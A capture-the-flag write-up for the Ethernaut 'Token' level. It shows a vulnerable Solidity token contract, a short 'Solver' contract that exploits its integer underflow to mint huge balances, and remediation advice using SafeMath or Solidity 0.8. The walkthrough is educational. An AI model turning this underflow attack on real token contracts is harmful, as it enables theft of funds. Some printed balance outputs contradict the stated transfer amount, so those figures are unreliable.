![Token](/assets/img/BigLevel5.svg)

- [Challenge](#challenge)
- [Solution](#solution)
- [Remediation](#remediation)
- [References](#references)
   
# Challenge

The level says:

> The goal of this level is for you to hack the basic token contract below.
> 
> You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.
>
>  Things that might help:
>
>  - What is an odometer?

And gives the following contract's code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

# Solution

As usual, we start by reading the contract and interacting with its functions to understand what it does.

Let's call some functions and see their values:

```javascript
await contract.totalSupply().then(v => v.toString())
'21000000'
```

```javascript
await contract.balanceOf(OUR_ADDRESS).then(v => v.toString())
'20'
```

```javascript
await contract.balanceOf(OWNER_ADDRESS).then(v => v.toString())
'20999980'
```

Ok, this makes sense. There is a total of 21000000 tokens in the contract, we have 20 and the owner has the rest. So, what happens if we try to transfer 1 token to the owner's address?

```javascript
await contract.transfer(OWNER_ADDRESS, 1)
```

```javascript
await contract.balanceOf(OUR_ADDRESS).then(v => v.toString())
'19'
```

```javascript
await contract.balanceOf(OWNER_ADDRESS).then(v => v.toString())
'20999981'
```

It works! Perfect! Now, how can we get more tokens? We cannot transfer the ones from the owner as the contract is keeping the balances by using `msg.sender`. So if we would want to get the tokens from the owner, we would need to call transfer from the owner's account... If we transfer money from ourselves we would end up having the same balance...

Could we try to write a contract that calls transfer? By doing that, `msg.sender` would be the "Solver" contract's address. But that address is going to have 0 as balance. So, what can we do?

If we read the level's info again, it gives us a clue, which says "What is an odometer?"

> An odometer is an instrument for measuring the distance travelled by a wheeled vehicle.

![Odometer](/assets/img/odometer.jpeg)

The interesting thing about this instrument is, what happens, once it reaches 999999km, if we continue driving the car? It goes back to 000000!!

So this hints us that we would need to exploit an overflow (in this case an underflow)

> an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with a given number of digits – either higher than the maximum or lower than the minimum representable value.

Note that the balances and values are `uint`(`uint256`) which means unsigned integer (in these case of 256 bits) its minimum value is 0 (because it is an **unsigned** integer) and its maximum value is 2^256-1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935.

Also note that the `require` of the `transfer()` function is `balances[msg.sender] - _value >= 0`. Can a subtraction of two UNSIGNED integers be lesser than 0? Well, the answer is no.

So going back to our previous question, if we call transfer from a newly created contract that has a balance of 0 is the require going to pass? Let's try it...

We can code a `Solver.sol` like this:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "./Token.sol";

contract Solver {
    Token token;

    constructor(address tokenAddress) public {
        token = Token(tokenAddress);
    }

    function solve(uint _value) public {
        token.transfer(tx.origin, _value);
    }
}

```

This contract can be deployed with the Token's contract address and when the function `solve()` is called with a "value" as argument, it will call the Token's `transfer()` function with our address and the value as inputs. Let's run that code in remix and call it with a value of `100000000000`

And now let's check the balances of the contract:

```javascript
await contract.totalSupply().then(v => v.toString())
'21000000'
```

```javascript
await contract.balanceOf(OUR_ADDRESS).then(v => v.toString())
'10000000000000019'
```

```javascript
await contract.balanceOf(OWNER_ADDRESS).then(v => v.toString())
'20999981'
```

And what is the Solver's balance going to be?

```javascript
await contract.balanceOf("0x67Fd61951Cd0291f173aB220304A1c25841ec888").then(v => v.toString())
'115792089237316195423570985008687907853269984665640564039457574007913129639936'
```

Which is exactly 2^256 - 100000000000 :) Because the variable "underflowed"

So that's all! We solved the challenge as we managed to get a LOT more tokens than provided (even more than the `totalSupply` of the contract :O)

![Well done](/assets/img/ethernaut_solved.png)

# Remediation

When performing arithmetic operations in solidity versions prior to 0.8, always use libraries like OpenZeppelin's [SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math) which wraps the arithmetic operations with overflow checks.

Note: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler now has built in overflow checking.

# References

- [SWC-101](https://swcregistry.io/docs/SWC-101)